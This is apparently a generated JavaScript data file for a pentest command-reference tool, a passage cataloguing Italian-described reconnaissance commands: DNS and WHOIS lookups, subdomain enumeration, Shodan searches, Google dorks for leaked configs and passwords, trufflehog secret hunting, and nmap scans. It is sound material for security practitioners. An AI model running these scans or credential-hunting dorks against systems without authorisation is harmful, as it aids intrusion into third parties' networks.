/* data.js — generato da Command Manager il 2026-07-13T15:34:50.005Z */
const COMMANDS = [
  {
    "id": "whois-domain",
    "name": "whois — Informazioni di Dominio",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "WHOIS & ASN",
    "description": "Recupera le informazioni di registrazione del dominio, come **registrar**, **date di creazione e scadenza**, **nameserver** e **contatti abuse**. Questa rappresenta una prima fase di raccolta passiva di informazioni: i record **NS** consentono infatti di identificare il provider DNS utilizzato e, spesso, anche l'infrastruttura di hosting associata.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "whois",
      "osint",
      "registrar"
    ],
    "template": "whois <domain>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — External recon methodology",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology"
      }
    ]
  },
  {
    "id": "whois-asn",
    "name": "whois — IP → ASN / netblock",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "WHOIS & ASN",
    "description": "Da un IP scopri a chi appartiene la rete: numero ASN, blocco di indirizzi (prefisso BGP) e owner, tramite Team Cymru. Mostra tutto il range di IP in cui rientra il target, così troviamo altri IP nello scope. Lo spazio prima di `-v` è obbligatorio (quirk di Cymru).",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "asn",
      "cymru",
      "netblock",
      "osint"
    ],
    "template": "whois -h whois.cymru.com \" -v <ip>\"",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Cymru ASN",
        "template": "whois -h whois.cymru.com \" -v <ip>\"",
        "description": "Lookup Team Cymru: ASN, prefisso BGP, paese e owner in una riga."
      },
      {
        "id": "plain",
        "label": "Plain whois",
        "template": "whois <ip>",
        "description": "whois classico sull’IP: assegnatario del blocco, range e contatti RIR."
      }
    ],
    "refs": [
      {
        "label": "Team Cymru — IP→ASN mapping",
        "url": "https://team-cymru.com/community-services/ip-asn-mapping/"
      }
    ]
  },
  {
    "id": "dig-records",
    "name": "dig — DNS records",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "DNS Records",
    "description": "Chiede i record DNS a un resolver pubblico (es. 8.8.8.8). La query ANY oggi viene quasi sempre rifiutata (RFC 8482), quindi conviene chiedere un tipo alla volta (A, MX, TXT, NS…). I record MX mostrano chi gestisce la mail; i TXT contengono SPF/DKIM e le verifiche dei servizi SaaS usati dal target.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dig",
      "dns"
    ],
    "template": "for r in A AAAA MX NS TXT SOA; do dig +noall +answer <domain> $r @1.1.1.1; done",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutti i record",
        "template": "for r in A AAAA MX NS TXT SOA; do dig +noall +answer <domain> $r @1.1.1.1; done",
        "description": "Cicla A/AAAA/MX/NS/TXT/SOA in un colpo: quadro DNS completo."
      },
      {
        "id": "short",
        "label": "A",
        "template": "dig +short <domain> @1.1.1.1",
        "description": "Solo record A, output pulito. Veloce per risolvere l’host."
      },
      {
        "id": "mx",
        "label": "MX",
        "template": "dig +short mx <domain> @1.1.1.1",
        "description": "Solo MX → mail provider (Google / O365 / on-prem)."
      },
      {
        "id": "txt",
        "label": "TXT / SPF",
        "template": "dig +short txt <domain> @1.1.1.1",
        "description": "TXT/SPF/DKIM/DMARC → SaaS verificati e policy mail."
      },
      {
        "id": "ns",
        "label": "NS",
        "template": "dig +short ns <domain> @1.1.1.1",
        "description": "Nameserver autoritativi → provider DNS e target per lo zone transfer."
      },
      {
        "id": "any",
        "label": "ANY (spesso rifiutato)",
        "template": "dig any <domain> @1.1.1.1",
        "description": "Query ANY: spesso rifiutata dai resolver moderni, tienila come fallback."
      }
    ],
    "refs": [
      {
        "label": "RFC 8482 — minimal ANY responses",
        "url": "https://www.rfc-editor.org/rfc/rfc8482"
      }
    ]
  },
  {
    "id": "host-lookup",
    "name": "host — quick lookup",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "DNS Records",
    "description": "Lookup DNS veloce: IPv4 (A), IPv6 (AAAA) e mail server (MX) con un comando solo. Non usa ANY, quindi risponde sempre. Comodo come primo check, prima di passare a tool più completi (dig, dnsrecon).",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "host",
      "dns"
    ],
    "template": "host <domain>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ]
  },
  {
    "id": "crtsh",
    "name": "crt.sh — CT log subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "I log di Certificate Transparency espongono sottodomini (anche dev/staging) senza toccare il target. Rimuove i prefissi wildcard e deduplica.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "crtsh",
      "ct-logs",
      "subdomains",
      "hackertarget"
    ],
    "template": "curl -s 'https://crt.sh/?q=%25.<domain>&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crtsh.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "crt.sh",
        "template": "curl -s 'https://crt.sh/?q=%25.<domain>&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crtsh.txt",
        "description": "CT logs via crt.sh → sottodomini, anche dev/staging. Rimuove i wildcard e deduplica."
      },
      {
        "id": "hackertarget",
        "label": "HackerTarget",
        "template": "curl -s 'https://api.hackertarget.com/hostsearch/?q=<domain>' | cut -d',' -f1 > hackertarget.txt",
        "description": "Interroga l'API di HackerTarget per ottenere gli host noti del dominio. L'API risponde con righe `host,IP` e `cut` tiene solo l'hostname. La versione gratuita è limitata a poche query al giorno per IP; unisci i risultati a `crtsh.txt`."
      }
    ],
    "refs": [
      {
        "label": "crt.sh",
        "url": "https://crt.sh"
      }
    ]
  },
  {
    "id": "subfinder",
    "name": "subfinder — enum subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Aggrega sottodomini da molte fonti passive. \n`-all` attiva tutte le fonti (più lento). Aggiungi le API key in `~/.config/subfinder/provider-config.yaml` per una copertura piena.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "subfinder",
      "projectdiscovery",
      "subdomains"
    ],
    "template": "subfinder -d <domain> -all -silent -o subfinder.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "subfinder — GitHub",
        "url": "https://github.com/projectdiscovery/subfinder"
      }
    ]
  },
  {
    "id": "amass-passive",
    "name": "amass — enum subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Enumera i sottodomini con OWASP Amass in modalità passiva (`-passive`): raccoglie i dati da molte fonti pubbliche (OSINT) senza interrogare i DNS del target, quindi è silenzioso. Le fonti e le API key si impostano in `~/.config/amass/config.ini`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "amass",
      "owasp",
      "subdomains"
    ],
    "template": "amass enum -passive -d <domain> -o amass.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "OWASP Amass — GitHub",
        "url": "https://github.com/owasp-amass/amass"
      }
    ]
  },
  {
    "id": "assetfinder",
    "name": "assetfinder — enum subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Raccolta di sottodomini veloce e leggera. Usalo insieme a subfinder/amass e unisci le liste.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "assetfinder",
      "subdomains"
    ],
    "template": "assetfinder --subs-only <domain> | sort -u > assetfinder.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "assetfinder — GitHub",
        "url": "https://github.com/tomnomnom/assetfinder"
      }
    ]
  },
  {
    "id": "chaos",
    "name": "chaos — enum subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Interroga il dataset Chaos di ProjectDiscovery. Serve una API key gratuita (env `PDCP_API_KEY` o `-key`). Rate limit 60 req/min.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "chaos",
      "projectdiscovery",
      "subdomains"
    ],
    "template": "chaos -d <domain> -key <key> -silent -o chaos.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      },
      {
        "key": "key",
        "label": "API key",
        "placeholder": "PDCP_API_KEY"
      }
    ],
    "refs": [
      {
        "label": "chaos-client — GitHub",
        "url": "https://github.com/projectdiscovery/chaos-client"
      }
    ]
  },
  {
    "id": "dnsx-resolve",
    "name": "dnsx — resolve & validate",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Unisce tutte le liste di sottodomini raccolte (`*.txt`), le deduplica e le risolve con `dnsx`. Tiene solo gli host vivi con il loro record A (`-a -resp`). È il ponte tra la lista passiva e i target davvero attivi; salva l'output in `resolved.txt`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dnsx",
      "projectdiscovery",
      "resolve"
    ],
    "template": "cat *.txt | sort -u | dnsx -silent -a -resp | tee resolved.txt",
    "params": [],
    "refs": [
      {
        "label": "dnsx — GitHub",
        "url": "https://github.com/projectdiscovery/dnsx"
      }
    ]
  },
  {
    "id": "waybackurls",
    "name": "waybackurls — archived URLs",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Web Archive",
    "description": "Recupera dalla Wayback Machine tutti gli URL che ha archiviato per il dominio: vecchi endpoint, parametri, backup e path ormai rimossi ma ancora utili. È del tutto passivo, non tocca il target. Salva la lista deduplicata in `wayback.txt`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "waybackurls",
      "wayback",
      "urls"
    ],
    "template": "waybackurls <domain> | sort -u > wayback.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "waybackurls — GitHub",
        "url": "https://github.com/tomnomnom/waybackurls"
      }
    ]
  },
  {
    "id": "gau",
    "name": "gau — getallurls",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Web Archive",
    "description": "Come waybackurls, ma pesca gli URL da più archivi (Wayback, CommonCrawl, URLScan, OTX), quindi copre di più. Con `--subs` include anche i sottodomini. È un'ottima lista di partenza per il fuzzing e il param mining successivi; salva in `gau.txt`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "gau",
      "urls",
      "commoncrawl"
    ],
    "template": "gau --subs <domain> | sort -u > gau.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "gau — GitHub",
        "url": "https://github.com/lc/gau"
      }
    ]
  },
  {
    "id": "theharvester",
    "name": "theHarvester — emails & hosts",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "OSINT & Email",
    "description": "Aggrega email, sottodomini, host e nomi da molte fonti pubbliche. `-b all` lancia tutti i moduli (alcuni richiedono API key e danno solo warning). Le email rivelano la naming convention → user list.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "theharvester",
      "osint",
      "emails"
    ],
    "template": "theHarvester -d <domain> -b all -l 500 -f harvest",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutte le fonti",
        "template": "theHarvester -d <domain> -b all | tee theharvester.txt",
        "description": "Tutte le fonti con l'output salvato in `theharvester.txt` tramite `tee`: testo greppabile, invece dei file strutturati di `-f`."
      },
      {
        "id": "free",
        "label": "Senza API key",
        "template": "theHarvester -d <domain> -b crtsh,duckduckgo,bing,otx,rapiddns -l 500",
        "description": "Solo fonti senza API key: veloce e zero setup."
      }
    ],
    "refs": [
      {
        "label": "theHarvester — GitHub",
        "url": "https://github.com/laramies/theHarvester"
      }
    ]
  },
  {
    "id": "shodan-host",
    "name": "shodan — host lookup",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Shodan / Censys",
    "description": "Mostra tutto quello che Shodan sa di un IP (porte aperte, banner, CVE note, certificati) senza inviare un solo pacchetto al target. La prima volta configura la API key con `shodan init <key>`.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "shodan",
      "osint"
    ],
    "template": "shodan host <ip>",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "Shodan CLI",
        "url": "https://cli.shodan.io/"
      }
    ]
  },
  {
    "id": "shodan-search",
    "name": "shodan — search filters",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Shodan / Censys",
    "description": "Cerca in Shodan gli asset esposti filtrando per hostname, CN del certificato, dati SSL o hash della favicon. Ogni ricerca consuma quota. Il filtro sul certificato è particolarmente utile: fa emergere host che usano lo stesso certificato del target, anche su IP diversi.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "shodan",
      "osint"
    ],
    "template": "shodan search 'hostname:<domain>'",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "hostname",
        "template": "shodan search 'hostname:<domain>'",
        "description": "Host il cui hostname contiene il dominio (`hostname:`)."
      },
      {
        "id": "cn",
        "label": "cert CN",
        "template": "shodan search 'ssl.cert.subject.CN:<domain>'",
        "description": "Host che hanno il CN del certificato uguale al dominio (`ssl.cert.subject.CN:`): rivela infrastruttura correlata anche su altri IP."
      },
      {
        "id": "ssl",
        "label": "Dati SSL",
        "template": "shodan search 'ssl:<domain>'",
        "description": "Ricerca ampia in tutti i dati SSL/TLS collegati al dominio (`ssl:`)."
      },
      {
        "id": "favicon",
        "label": "favicon hash",
        "template": "shodan search 'http.favicon.hash:<hash>'",
        "description": "Trova host che servono la stessa favicon confrontando l'hash `mmh3` (`http.favicon.hash:`). Utile per scovare staging o mirror su IP diversi. L'hash si calcola con `favfreak` o con uno snippet `mmh3`."
      }
    ],
    "refs": [
      {
        "label": "Shodan search filters",
        "url": "https://www.shodan.io/search/filters"
      }
    ]
  },
  {
    "id": "smap",
    "name": "smap — Shodan-powered nmap",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Shodan / Censys",
    "description": "Restituisce un output in stile nmap (porte e servizi) prendendo i dati da Shodan InternetDB, quindi senza inviare pacchetti al target e senza API key. Dà un quadro delle porte veloce e del tutto passivo.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "smap",
      "shodan",
      "ports"
    ],
    "template": "smap <ip>",
    "params": [
      {
        "key": "ip",
        "label": "IP / host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "Smap — GitHub",
        "url": "https://github.com/s0md3v/Smap"
      }
    ]
  },
  {
    "id": "google-dorks",
    "name": "Google dorks pack",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Google Dorks",
    "description": "Prova questi dork uno alla volta contro il dominio. I documenti pubblici perdono metadati (nomi utente, software usato); il dork `index of` espone le directory aperte; quelli su config e password trovano segreti trapelati.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "google",
      "dorks",
      "osint"
    ],
    "template": "site:<domain> (filetype:pdf OR filetype:xlsx OR filetype:docx)",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Documenti",
        "template": "site:<domain> (filetype:pdf OR filetype:xlsx OR filetype:docx)",
        "description": "Documenti pubblici (`pdf`, `xlsx`, `docx`): dai loro metadati ricavi nomi utente, software e path interni."
      },
      {
        "id": "login",
        "label": "Admin/Login",
        "template": "site:<domain> (inurl:admin OR inurl:login)",
        "description": "Pannelli admin / pagine di login esposte."
      },
      {
        "id": "index",
        "label": "Dir aperte",
        "template": "site:<domain> intitle:\"index of\"",
        "description": "Directory aperte con listing attivo (`index of`)."
      },
      {
        "id": "conf",
        "label": "Configs",
        "template": "site:<domain> (ext:conf OR ext:cnf OR ext:cfg OR ext:env)",
        "description": "File di configurazione trapelati (`conf`, `cnf`, `cfg`, `env`)."
      },
      {
        "id": "secret",
        "label": "Segreti",
        "template": "site:<domain> intext:password",
        "description": "Pagine che contengono la parola `password`: possibili credenziali trapelate."
      },
      {
        "id": "paste",
        "label": "Paste/Git",
        "template": "\"<domain>\" (inurl:pastebin OR inurl:github OR inurl:gitlab)",
        "description": "Menzioni del dominio su Pastebin, GitHub o GitLab: possibile codice o credenziali esposte."
      }
    ],
    "refs": [
      {
        "label": "Google Hacking DB (Exploit-DB)",
        "url": "https://www.exploit-db.com/google-hacking-database"
      }
    ]
  },
  {
    "id": "trufflehog-gh",
    "name": "trufflehog — GitHub secrets",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Code & Secret Leaks",
    "description": "Scansiona le organizzazioni e i repo GitHub del target cercando chiavi, token e credenziali trapelate. Con `--results=verified` mostra solo i segreti verificati come ancora validi tramite API, che sono spesso la strada più rapida a credenziali funzionanti.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "trufflehog",
      "secrets",
      "github",
      "osint"
    ],
    "template": "trufflehog github --org=<org> --results=verified",
    "params": [
      {
        "key": "org",
        "label": "GitHub org",
        "placeholder": "target-org"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "GitHub org",
        "template": "trufflehog github --org=<org> --results=verified",
        "description": "Tutti i repo pubblici di un’organizzazione GitHub."
      },
      {
        "id": "repo",
        "label": "Repo singolo",
        "template": "trufflehog git https://github.com/<org>/<repo> --results=verified",
        "description": "Un singolo repository (anche fork e branch storici)."
      }
    ],
    "refs": [
      {
        "label": "TruffleHog — GitHub",
        "url": "https://github.com/trufflesecurity/trufflehog"
      }
    ]
  },
  {
    "id": "rtt-check",
    "name": "RTT check — Prima di scansionare",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Misura la latenza (RTT) verso il target: decide quanto puoi spingere nmap senza perdere porte.\n- `< 30ms` → `--min-rate 5000 --max-retries 2`\n- `30–100ms` (VPN tipica) → `--min-rate 3000 --max-retries 3`\n- `> 100ms` o instabile → `--min-rate 1000 --max-retries 5`\nSe l’ICMP è bloccato, hping3 manda un SYN e ricava l’RTT dal RST.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "icmp"
    ],
    "tags": [
      "ping",
      "hping3",
      "rtt",
      "latency"
    ],
    "template": "ping -c 5 <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "ping",
        "template": "ping -c 5 <ip>",
        "description": "ICMP echo: leggi `rtt min/avg/max` nell’ultima riga."
      },
      {
        "id": "hping80",
        "label": "hping3 :80",
        "template": "sudo hping3 -S -p 80 -c 5 <ip>",
        "description": "SYN sulla 80 quando l’ICMP è filtrato: l’RTT si ricava dai pacchetti di risposta."
      },
      {
        "id": "hping443",
        "label": "hping3 :443",
        "template": "sudo hping3 -S -p 443 -c 5 <ip>",
        "description": "Fallback sulla 443 se la 80 non risponde."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting Network",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/index.html"
      }
    ]
  },
  {
    "id": "nmap-quick",
    "name": "nmap — quick scan",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Top 1000 porte TCP, punto di partenza: dà subito i servizi principali mentre lanci il full scan.\n- `-sV` = service detection\n- `-sC` = default script\n- `-O` = OS detection\n- `--open` = mostra solo le porte aperte\n- `-oA` = salva nei tre formati",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "tcp"
    ],
    "tags": [
      "nmap",
      "scan"
    ],
    "template": "sudo nmap -sC -sV -O --open -oA nmap/quick <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Rapido",
        "template": "sudo nmap -sC -sV -O --open -oA nmap/quick <ip>",
        "description": "Top 1000 + `-sC -sV -O`. Copre i servizi più comuni in pochi secondi."
      },
      {
        "id": "pn",
        "label": "-Pn (no ping)",
        "template": "sudo nmap -sC -sV -O -Pn --open -oA nmap/quick <ip>",
        "description": "Salta l’host discovery: usalo se l’host blocca l’ICMP e nmap lo segna “down”."
      }
    ],
    "refs": [
      {
        "label": "Nmap reference",
        "url": "https://nmap.org/book/man.html"
      }
    ]
  },
  {
    "id": "nmap-full",
    "name": "nmap — full TCP",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Tutte le 65535 porte: obbligatorio, i servizi interessanti stanno spesso su porte alte. `-sS` (SYN, serve root) è più veloce di `-sT`. Su VM+VPN non superare `--min-rate 5000` o perdi porte; se ne mancano, rallenta e alza i retry.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "tcp"
    ],
    "tags": [
      "nmap",
      "scan",
      "full-tcp"
    ],
    "template": "sudo nmap -p- -sS -T4 --min-rate 3000 --max-retries 2 --open -oA nmap/full_tcp <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tuned (VPN)",
        "template": "sudo nmap -p- -sS -T4 --min-rate 3000 --max-retries 2 --open -oA nmap/full_tcp <ip>",
        "description": "Bilanciato per VPN (RTT ~50ms). Buon default."
      },
      {
        "id": "fast",
        "label": "Veloce (RTT<30)",
        "template": "sudo nmap -p- -sS -T4 --min-rate 5000 --max-retries 2 --open -oA nmap/full_tcp <ip>",
        "description": "Solo su reti veloci e stabili; su VPN droppa porte."
      },
      {
        "id": "safe",
        "label": "Sicuro (instabile)",
        "template": "sudo nmap -p- -sS -T4 --min-rate 1000 --max-retries 5 --open -oA nmap/full_tcp_safe <ip>",
        "description": "Rete lenta o porte sospette mancanti: più lento ma affidabile."
      },
      {
        "id": "proxychains",
        "label": "proxychains",
        "template": "proxychains -q nmap -sT -Pn -T4 -p- --max-retries 2 <ip>",
        "description": "Via pivot/tunnel: obbligatori `-sT` (no raw socket) e `-Pn`."
      }
    ],
    "refs": [
      {
        "label": "Nmap reference",
        "url": "https://nmap.org/book/man.html"
      }
    ]
  },
  {
    "id": "nmap-targeted",
    "name": "nmap — service scan",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Scan approfondito SOLO sulle porte trovate dal full scan. Qui raccogli versioni e banner da incrociare con i CVE.\n- `-sV` = version detection\n- `-sC` = default script\n- `-O` = OS detection",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "tcp"
    ],
    "tags": [
      "nmap",
      "targeted"
    ],
    "template": "sudo nmap -p<ports> -sC -sV -O -oA nmap/targeted <ip>",
    "params": [
      {
        "key": "ports",
        "label": "Porte",
        "placeholder": "22,80,445"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "Nmap reference",
        "url": "https://nmap.org/book/man.html"
      }
    ]
  },
  {
    "id": "nmap-vuln",
    "name": "nmap — vuln NSE",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "TCP Scans",
    "description": "Lancia gli script NSE della categoria `vuln` sulle porte note: check rapido di vulnerabilità conosciute. Rumoroso, evitalo dove serve discrezione.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "tcp"
    ],
    "tags": [
      "nmap",
      "vuln",
      "nse"
    ],
    "template": "sudo nmap -p<ports> --script vuln -oA nmap/vuln <ip>",
    "params": [
      {
        "key": "ports",
        "label": "Porte",
        "placeholder": "80,443"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "NSE — categoria vuln",
        "url": "https://nmap.org/nsedoc/categories/vuln.html"
      }
    ]
  },
  {
    "id": "nmap-udp",
    "name": "nmap — UDP top ports",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "UDP Scans",
    "description": "Non dimenticare UDP: SNMP (161), IPMI (623), TFTP (69), NTP (123), DNS (53) sono vettori frequenti. UDP è lento → scansiona solo le porte più utili.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "udp"
    ],
    "tags": [
      "nmap",
      "udp"
    ],
    "template": "sudo nmap -sU --top-ports 100 --open -oA nmap/udp <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Top 100",
        "template": "sudo nmap -sU --top-ports 100 --open -oA nmap/udp <ip>",
        "description": "Compromesso tra copertura e tempo."
      },
      {
        "id": "key",
        "label": "Porte chiave",
        "template": "sudo nmap -sU -p 53,69,123,161,500,623 --open -oA nmap/udp <ip>",
        "description": "Solo i servizi UDP che contano: velocissimo."
      }
    ],
    "refs": [
      {
        "label": "Nmap reference",
        "url": "https://nmap.org/book/man.html"
      }
    ]
  },
  {
    "id": "unicornscan-udp",
    "name": "unicornscan — fast UDP",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "UDP Scans",
    "description": "Scanner UDP asincrono: invia i probe e riceve le risposte in parallelo, quindi copre tutte le 65535 porte molto più in fretta di `nmap -sU`.\n- `-m U` = modalità UDP\n- `-Iv` = output immediato e verboso\n- `-r 5000` = pacchetti al secondo\n\nServe root (raw socket). Usalo per un primo sweep UDP completo, poi conferma le porte trovate con `nmap -sU -sV`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "udp"
    ],
    "tags": [
      "unicornscan",
      "udp",
      "scan"
    ],
    "template": "sudo unicornscan -m U -Iv <ip>:1-65535 -r 5000",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "unicornscan — Kali Tools",
        "url": "https://www.kali.org/tools/unicornscan/"
      }
    ]
  },
  {
    "id": "nmap-pingsweep",
    "name": "nmap — host discovery subnet",
    "category": "info-gathering",
    "subcategory": "active-recon",
    "group": "Host Discovery",
    "description": "Trova gli host vivi in una subnet senza port scan (`-sn`). Utile dopo un pivot in rete interna per mappare i target. Se sembrano tutti down il firewall blocca i probe di default: usa le varianti per cambiare tipo di sonda (ARP in LAN, ICMP, oppure TCP/UDP ping quando l'ICMP è filtrato).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "icmp"
    ],
    "tags": [
      "nmap",
      "sweep",
      "discovery"
    ],
    "template": "sudo nmap -sn <subnet> -oA nmap/ping_sweep",
    "params": [
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0/24"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Ping sweep",
        "template": "sudo nmap -sn <subnet> -oA nmap/ping_sweep",
        "description": "Probe di default (`-sn`): ARP in LAN, altrimenti ICMP echo + TCP ACK 80 + ICMP timestamp. Estrai i vivi in `live_hosts.txt`."
      },
      {
        "id": "arp",
        "label": "ARP (LAN)",
        "template": "sudo nmap -sn -PR <subnet> -oA nmap/ping_sweep",
        "description": "Solo ARP (`-PR`): il metodo più affidabile sulla stessa L2, non filtrabile da un firewall di livello 3. Vale solo in rete interna."
      },
      {
        "id": "icmp",
        "label": "ICMP echo",
        "template": "sudo nmap -sn -PE <subnet> -oA nmap/ping_sweep",
        "description": "Solo ICMP echo (`-PE`), il classico ping. Rapido su reti esterne che lasciano passare l'ICMP."
      },
      {
        "id": "icmp-alt",
        "label": "ICMP timestamp/netmask",
        "template": "sudo nmap -sn -PP -PM <subnet> -oA nmap/ping_sweep",
        "description": "ICMP timestamp (`-PP`) e netmask (`-PM`): fallback quando l'echo request è bloccato ma altri tipi di ICMP passano."
      },
      {
        "id": "tcp-syn",
        "label": "TCP SYN ping",
